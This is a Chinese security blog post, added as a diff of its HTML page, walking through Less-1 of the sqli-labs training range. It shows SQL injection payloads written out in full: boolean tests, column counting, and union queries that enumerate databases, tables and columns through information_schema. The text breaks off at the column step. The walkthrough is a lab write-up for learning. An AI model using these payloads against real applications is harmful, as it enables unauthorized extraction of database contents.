@@ -1,0 +1,1338 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>sqli-labs靶场 | 废柴の博客</title><meta name="keywords" content="靶场"><meta name="author" content="废柴"><meta name="copyright" content="废柴"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="sqli-labs靶场"><meta name="application-name" content="sqli-labs靶场"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="sqli-labs靶场"><meta property="og:url" content="https://94248.github.io/2024/03/09/sqli-labs%E9%9D%B6%E5%9C%BA/index.html"><meta property="og:site_name" content="废柴の博客"><meta property="og:description" content="#sqli-labs靶场通关less-1 根据提示需要输入一个ID和值(请输入ID作为带有数值的参数) 当输入id&amp;#x3D;1时会显示id 为1的数据。这里多演示几个对照数据库。     黑盒角度从黑盒角度，只能去测试这个地方是否有注入点。  猜测是数字型时 and 1&amp;#x3D;1 --+ and 1&amp;#x3D;2"><meta property="og:locale" content="zh-CN"><meta property="og:image" content="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202403181926113.jpg"><meta property="article:author" content="废柴"><meta property="article:tag" content="废柴,网络安全,web安全"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202403181926113.jpg"><link rel="shortcut icon" href="/img/favicon.ico"><link rel="canonical" href="https://94248.github.io/2024/03/09/sqli-labs%E9%9D%B6%E5%9C%BA/"><link rel="preconnect" href="//npm.elemecdn.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://npm.elemecdn.com/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/@fancyapps/ui@4.0.31/dist/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  friends_vue_info: undefined,
+  navMusic: true,
+  changeMainColorPost: undefined,
+  algolia: undefined,
+  localSearch: undefined,
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"转为繁体","rightMenuMsgToSimplifiedChinese":"转为简体"},
+  noticeOutdate: {"limitDay":365,"position":"top","messagePrev":"It has been","messageNext":"days since the last update, the content of the article may be outdated."},
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    simplehomepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#3b70fc","bgDark":"#1f1f1f","position":"top-center"},
+  source: {
+    justifiedGallery: {
+      js: 'https://npm.elemecdn.com/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
+      css: 'https://npm.elemecdn.com/flickr-justified-gallery@2.1.2/dist/fjGallery.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'sqli-labs靶场',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-03-18 19:26:59'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+
+          if (t === undefined) {
+            if (isLightMode) activateLightMode()
+            else if (isDarkMode) activateDarkMode()
+            else if (isNotSpecified || hasNoSupport) {
+              const now = new Date()
+              const hour = now.getHours()
+              const isNight = hour <= 6 || hour >= 18
+              isNight ? activateDarkMode() : activateLightMode()
+            }
+            window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
+              if (saveToLocal.get('theme') === undefined) {
+                e.matches ? activateDarkMode() : activateLightMode()
+              }
+            })
+          } else if (t === 'light') activateLightMode()
+          else activateDarkMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202211060950193.jpg"/><div class="loading-image-dot"></div><div id="loading-percentage">0%</div></div></div><script>const loadingPercentage = document.getElementById("loading-percentage");
+let loadingPercentageTimer = setInterval(function() {
+  var progressBar = document.querySelector(".pace-progress");
+  if (!progressBar) return
+  var currentValue = progressBar.getAttribute("data-progress-text");
+  if (currentValue !== loadingPercentage.textContent) {
+    loadingPercentage.textContent = currentValue;
+    if (currentValue === "100%") {
+      clearInterval(loadingPercentageTimer);
+    }
+  }
+}, 100);
+const preloader = {
+  endLoading: () => {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loading-box').classList.add("loaded")
+    Pace.restart()
+  },
+  initLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.remove("loaded")
+  }
+}
+window.addEventListener('load',()=> { preloader.endLoading() })
+
+if (true) {
+  document.addEventListener('pjax:send', () => { preloader.initLoading() })
+  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
+}</script><link rel="stylesheet" href="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/progress_bar/progress_bar.css"/><script async="async" src="https://npm.elemecdn.com/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div id="web_box"><div id="web_container"><div id="menu-mask"></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><div class="back-home-button"><i class="anzhiyufont anzhiyu-icon-grip-vertical"></i><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" href="https://94248.github.io/" title="博客" target="_blank"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" href="https://image.anheyu.com/" title="安知鱼图床" target="_blank"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://image.anheyu.com/favicon.ico" alt="安知鱼图床"/><span class="back-menu-item-text">安知鱼图床</span></a></div></div></div></div><a id="site-name" href="/" accesskey="h"><div class="title">废柴の博客</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page faa-parent animated-hover" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child" style="left:-31px;"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 分类</span></a></li></ul></div><div class="menus_item"><a class="site-page faa-parent animated-hover" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child" style="left:17px;"><li><a class="site-page child faa-parent animated-hover" href="/link/"><i class="anzhiyufont anzhiyu-icon-link faa-tada" style="font-size: 0.9em;"></i><span> 友人帐</span></a></li></ul></div><div class="menus_item"><a class="site-page faa-parent animated-hover" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child" style="left:17px;"><li><a class="site-page child faa-parent animated-hover" href="/essay/"><i class="anzhiyufont anzhiyu-icon-lightbulb faa-tada" style="font-size: 0.9em;"></i><span> 闲言碎语</span></a></li></ul></div></div></div><div id="nav-right"><div class="nav-button only-home" id="travellings_button" title="随机前往一个开往项目网站"><a class="site-page" onclick="anzhiyu.totraveling()" title="随机前往一个开往项目网站" href="javascript:void(0);" rel="external nofollow" data-pjax-state="external"><i class="anzhiyufont anzhiyu-icon-train"></i></a></div><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><input id="center-console" type="checkbox"/><label class="widget" for="center-console" title="中控台" onclick="anzhiyu.switchConsole();"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="/null" target="_blank"><img class="post-qr-code-img" alt="wechat" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/null"/></a><div class="post-qr-code-desc">wechat</div></li><li class="reward-item"><a href="/null" target="_blank"><img class="post-qr-code-img" alt="alipay" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/null"/></a><div class="post-qr-code-desc">alipay</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> <span>最新评论</span></span></div><div class="aside-list"><span>正在加载中...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/RCE/" style="font-size: 1.05rem;">RCE<sup>1</sup></a><a href="/tags/SSRF/" style="font-size: 1.05rem;">SSRF<sup>1</sup></a><a href="/tags/SSRF%E6%BC%8F%E6%B4%9E/" style="font-size: 1.05rem;">SSRF漏洞<sup>1</sup></a><a href="/tags/ctf/" style="font-size: 1.05rem;">ctf<sup>1</sup></a><a href="/tags/msf/" style="font-size: 1.05rem;">msf<sup>1</sup></a><a href="/tags/os%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" style="font-size: 1.05rem;">os命令注入漏洞<sup>1</sup></a><a href="/tags/python/" style="font-size: 1.05rem;">python<sup>1</sup></a><a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size: 1.05rem;">sql注入<sup>4</sup></a><a href="/tags/web/" style="font-size: 1.05rem;">web<sup>1</sup></a><a href="/tags/web%E5%89%8D%E7%AB%AF/" style="font-size: 1.05rem;">web前端<sup>1</sup></a><a href="/tags/xxe%E6%BC%8F%E6%B4%9E/" style="font-size: 1.05rem;">xxe漏洞<sup>1</sup></a><a href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" style="font-size: 1.05rem;">信息收集<sup>1</sup></a><a href="/tags/%E5%85%B6%E4%BB%96/" style="font-size: 1.05rem;">其他<sup>3</sup></a><a href="/tags/%E5%B7%A5%E5%85%B7/" style="font-size: 1.05rem;">工具<sup>3</sup></a><a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 1.05rem;">文件上传<sup>1</sup></a><a href="/tags/%E6%9D%82%E9%A1%B9/" style="font-size: 1.05rem;">杂项<sup>1</sup></a><a href="/tags/%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E/" style="font-size: 1.05rem;">目录遍历漏洞<sup>1</sup></a><a href="/tags/%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E6%BC%8F%E6%B4%9E/" style="font-size: 1.05rem;">身份认证漏洞<sup>1</sup></a><a href="/tags/%E9%9D%B6%E5%9C%BA/" style="font-size: 1.05rem;">靶场<sup>1</sup></a><a href="/tags/%E9%9D%B6%E6%9C%BA/" style="font-size: 1.05rem;">靶机<sup>1</sup></a></div></div><hr/></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>归档</span><a class="card-more-btn" href="/archives/" title="查看更多">
+    <i class="anzhiyufont anzhiyu-icon-angle-right"></i></a></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/03/"><span class="card-archive-list-date">三月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/01/"><span class="card-archive-list-date">一月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">2</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/12/"><span class="card-archive-list-date">十二月 2023</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">2</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/11/"><span class="card-archive-list-date">十一月 2023</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/10/"><span class="card-archive-list-date">十月 2023</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">2</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/09/"><span class="card-archive-list-date">九月 2023</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/08/"><span class="card-archive-list-date">八月 2023</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">4</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/07/"><span class="card-archive-list-date">七月 2023</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">3</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" onclick="anzhiyu.switchDarkMode()" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div><div class="console-btn-item on" id="consoleCommentBarrage" onclick="anzhiyu.switchCommentBarrage()" title="热评开关"><a class="commentBarrage"><i class="anzhiyufont anzhiyu-icon-message"></i></a></div><div class="console-btn-item" id="consoleMusic" onclick="anzhiyu.musicToggle()" title="音乐开关"><a class="music-switch"><i class="anzhiyufont anzhiyu-icon-music"></i></a></div><div class="console-btn-item" id="consoleKeyboard" onclick="anzhiyu.keyboardToggle()" title="快捷键开关"><a class="keyboard-switch"><i class="anzhiyufont anzhiyu-icon-keyboard"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="article-meta tags"><a class="article-meta__tags" href="/tags/%E9%9D%B6%E5%9C%BA/" tabindex="-1"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>靶场</span></a></span></div></div><h1 class="post-title">sqli-labs靶场</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-03-09T13:24:43.000Z" title="发表于 2024-03-09 21:24:43">2024-03-09</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-03-18T11:26:59.595Z" title="更新于 2024-03-18 19:26:59">2024-03-18</time></span></div><div class="meta-secondline"><span class="post-meta-separator"></span><span class="post-meta-wordcount"><i class="anzhiyufont anzhiyu-icon-file-word post-meta-icon" title="文章字数"></i><span class="post-meta-label" title="文章字数">字数总计:</span><span class="word-count" title="文章字数">3.8k</span><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-clock post-meta-icon" title="阅读时长"></i><span class="post-meta-label" title="阅读时长">阅读时长:</span><span>14分钟</span></span><span class="post-meta-separator"></span><span class="post-meta-pv-cv" id="" data-flag-title="sqli-labs靶场"><i class="anzhiyufont anzhiyu-icon-fw-eye post-meta-icon"></i><span class="post-meta-label" title="阅读量">阅读量:</span><span id="busuanzi_value_page_pv"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></span><span class="post-meta-separator">       </span><span class="post-meta-position" title="作者IP属地为湖北"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>湖北</span><span class="post-meta-separator"></span><span class="post-meta-commentcount"><i class="anzhiyufont anzhiyu-icon-comments post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/2024/03/09/sqli-labs%E9%9D%B6%E5%9C%BA/#post-comment" itemprop="discussionUrl"><span class="valine-comment-count" data-xid="/2024/03/09/sqli-labs%E9%9D%B6%E5%9C%BA/" itemprop="commentCount"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></a></span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section><div id="post-top-cover"><img class="nolazyload" id="post-top-bg" src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202403181926113.jpg"></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="sqli-labs靶场通关"><a href="#sqli-labs靶场通关" class="headerlink" title="#sqli-labs靶场通关"></a>#sqli-labs靶场通关</h1><h2 id="less-1"><a href="#less-1" class="headerlink" title="less-1"></a>less-1</h2><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202403092147420.png"></p>
+<p>根据提示需要输入一个ID和值(请输入ID作为带有数值的参数)</p>
+<p>当输入id&#x3D;1时会显示id 为1的数据。这里多演示几个对照数据库。</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202403092202842.png"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202403092202867.png"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202403092202899.png"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202403092204450.png"></p>
+<h3 id="黑盒角度"><a href="#黑盒角度" class="headerlink" title="黑盒角度"></a>黑盒角度</h3><p>从黑盒角度，只能去测试这个地方是否有注入点。 </p>
+<p>猜测是数字型时</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and 1=1 --+ </span><br><span class="line">and 1=2 --+</span><br><span class="line">原始sql查询语句为 select * from users where id=&#x27;$id&#x27;;</span><br><span class="line">执行恶意sql语句后 select* from users where id=&#x27;1 and 1=1--+&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p>由于原始sql语句是字符型没有闭合，发现页面没有任何回显</p>
+<p>字符型</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; and &#x27;1&#x27;=&#x27;1</span><br><span class="line">&#x27; and  &#x27;1&#x27;=&#x27;2</span><br><span class="line">原始sql查询语句为 select * from users where id=&#x27;$id&#x27;;</span><br><span class="line">执行恶意sql语句后 select* from users where id=&#x27;1&#x27;and &#x27;1&#x27;=&#x27;2&#x27;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>页面回显不同</p>
+<h3 id="白盒角度"><a href="#白盒角度" class="headerlink" title="白盒角度"></a>白盒角度</h3><p>白盒角度通过代码去确认是否存在sql注入</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202403092221901.png"></p>
+<p>定义了一个变量id用get类型去接受，并没有去做任何过滤直接带去sql语句中去查询(变量id是字符类型)。导致用户可以去输入恶意语句</p>
+<h3 id="开始注入"><a href="#开始注入" class="headerlink" title="开始注入"></a>开始注入</h3><p>由于在源码中发现打印了mysql 报错信息说明可以进行报错注入</p>
+<h4 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h4><p><strong>测试表的字段数</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; order by 1--+ 正常</span><br><span class="line">1&#x27; order by 2--+ 正常</span><br><span class="line">1&#x27; order by 3--+ 正常</span><br><span class="line">1&#x27; order by 4--+ 报错</span><br></pre></td></tr></table></figure>
+
+<p>说明字段数为3</p>
+<p>另一种字段查询方式</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; union select null--+</span><br><span class="line">1&#x27; union select null,null--+</span><br><span class="line">1&#x27; union select null,null,null--+ </span><br><span class="line">添加到正常显示数据为止，可以确定字段数为3</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>由于union 查询，要求select 具有相同的列数可以用null去填充，当填充列数与前一条select列数相同时才会返回数据。</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202403101010794.png"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202403101011575.png"></p>
+<p>这也就是为什么联合查询要输入那么多的数字。要求于前一条列数保持一致</p>
+<p>当列数确定后就需要去看哪些数字可以回显数据。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; union select 1,2,3--+  # 当这样去写会发现无法显示，可以去输入一个不存在的值让他去回显。</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202403101018998.png"></p>
+<p>如上图所示2,3回显了数据。</p>
+<p><strong>查询当前数据的名和用户</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1’ union select 1,database(),user()--+</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202403101020371.png"></p>
+<p>数据库名为security 用户名为 root</p>
+<p><strong>查询当前数据库的所有库</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27; union select 1,group_concat(schema_name),3  from  information_schema.schemata--+</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202403101026192.png"></p>
+<p>所有的库</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202403101027002.png"></p>
+<p>与数据库对比是否一致</p>
+<p><strong>查询表</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()  --+</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202403101034067.png"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://xdm-blog.oss-cn-beijing.aliyuncs.com/202403101034283.png"></p>
+<p><strong>查询字段</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and  table_name=&#x27;users&#x27; --+</span><br></pre></td></tr></table></figure>
+
+<p>查询users 这个表的字段</p>
